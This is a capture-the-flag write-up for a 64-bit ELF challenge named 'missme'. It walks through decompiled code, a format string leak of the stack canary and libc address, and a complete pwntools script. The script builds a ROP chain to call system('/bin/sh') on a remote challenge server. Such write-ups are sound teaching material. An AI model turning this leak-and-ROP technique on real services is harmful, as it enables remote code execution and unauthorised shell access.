# MissMe

## info

we're given an elf binary `missme` along with a libc and a `run.sh` script to start the `missme` binary with given ld and libc...

```
$ file missme
missme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cd942396eb1ff8a507f2e5ed18e76c14e0f8ca86, not stripped
```

and security mechanisms of the file:
```
$ checksec --file missme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

decompiled code of `main` function is as follow:
```c

undefined8 main(undefined8 argc, char **argv)
{
    int64_t iVar1;
    int64_t iVar2;
    undefined8 uVar3;
    int64_t in_FS_OFFSET;
    char **var_830h;
    int64_t var_824h;
    undefined8 var_814h;
    int64_t canary;
    
    iVar1 = *(int64_t *)(in_FS_OFFSET + 0x28);
    puts(0x2008);
    puts(0x20b0);
    puts(0x2158);
    puts(0x2200);
    puts(0x22a8);
    puts(0x2350);
    puts(0x23f8);
    puts(0x24a0);
    puts(
        "                                                                                                                                                                      "
        );
    fflush(_reloc.stdout);
    setvbuf(_reloc.stdin, 0, 2, 0);
    setvbuf(_reloc.stdout, 0, 2, 0);
    signal(0xe, clocker);
    alarm(0x3c);
    var_814h._0_4_ = 0;
    do {
        if (1 < (int32_t)var_814h) {
            uVar3 = 1;
code_r0x00001364:
            if (iVar1 != *(int64_t *)(in_FS_OFFSET + 0x28)) {
                uVar3 = __stack_chk_fail();
            }
            return uVar3;
        }
        iVar2 = fgets((int64_t)&var_814h + 4, 0x900, _reloc.stdin);
        if (iVar2 == 0) {
            uVar3 = 0;
            goto code_r0x00001364;
        }
        iVar2 = strchr((int64_t)&var_814h + 4, 0x6e);
        if (iVar2 == 0) {
            printf((int64_t)&var_814h + 4);
            fflush(_reloc.stdout);
        }
        var_814h._0_4_ = (int32_t)var_814h + 1;
    } while( true );
}
```

it simply runs a loop just twice to perform the following:
1. get an input string of at most 0x900 and store it at `rbp - 0x818` (stack overflow)
2. print it using printf and then fflush to force output buffer write (format string vulnerability)

# exploit

we get to do this twice...

so with first round of loop, we can leak stack canary and __libc_start_main + some offset from past the base pointer...

canary is at rbp-8 and __libc_start_main addr will be at rbp+16 iirc...

after leaking canary and libc base address, we can overflow the stack by ease and call system, using a `pop rdi; ret` gadget and '/bin/sh\x00' address from libc to prepare the call...

I found the correct offset/argnum for format string by just playing around and printing them... which isn't a good way but worked for me...

there is also a single ret gadget used in rop which is to adjust address alignment for system call, otherwise some vector instruction inside it would segfault...

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'


def exploit(p, libc, pop_rdi_offset, single_ret_offset, local):
    p.recv()

    bin_sh_offset = next(libc.search(b'/bin/sh\x00'))

    # canary and libc leak

    payload = b'0x%267$016lx - 0x%269$016lx - :::'
    p.sendline(payload)

    leaks = p.recvuntil(b':::').split(b' - ')
    print(p.recvline())

    canary_leak = int(leaks[0], 16)
    libc_start_main_leak = int(leaks[1], 16) - 243
    if not local:
        libc_start_main_leak += 8

    __libc_start_main = libc.symbols['__libc_start_main']
    libc_base = libc_start_main_leak - __libc_start_main

    bin_sh_addr = libc_base + bin_sh_offset
    single_ret = libc_base + single_ret_offset
    pop_rdi = libc_base + pop_rdi_offset
    libc_system = libc_base + libc.symbols['system']
    libc_exit = libc_base + libc.symbols['exit']

    print("[+] canary leak:       0x%016x" % canary_leak)
    print("[+] bin sh addr:       0x%016x" % bin_sh_addr)
    print("[+] __libc_start_main: 0x%016x" % libc_start_main_leak)
    print("[+] libc base:         0x%016x" % libc_base)
    print("[+] libc pop rdi:      0x%016x" % pop_rdi)
    print("[+] libc xor eax:      0x%016x" % single_ret)
    print("[+] libc system:       0x%016x" % libc_system)

    # rewrite ret address to set rdi and call system

    payload = b'A' * 0x808
    payload += p64(canary_leak) + p64(libc_system)
    payload += p64(pop_rdi) + p64(bin_sh_addr)
    payload += p64(single_ret)
    payload += p64(libc_system)
    payload += p64(libc_exit)

    #gdb.attach(p)

    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    local = sys.argv[1:2] and sys.argv[1] == 'local'
    if local:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process(['./missme'])
    else:
        libc = ELF('./libc.so.6')
        p = remote('185.14.184.242', 15990)
        #p = process(['./ld-2.28.so', '--library-path', './', './missme'])
        #p = process(['./run.sh'])

    rop = ROP(libc)
    pop_rdi_offset = (rop.find_gadget(['pop rdi', 'ret']))[0]
    single_ret_offset = (rop.find_gadget(['ret']))[0]

    exploit(p, libc, pop_rdi_offset, single_ret_offset, local)
```
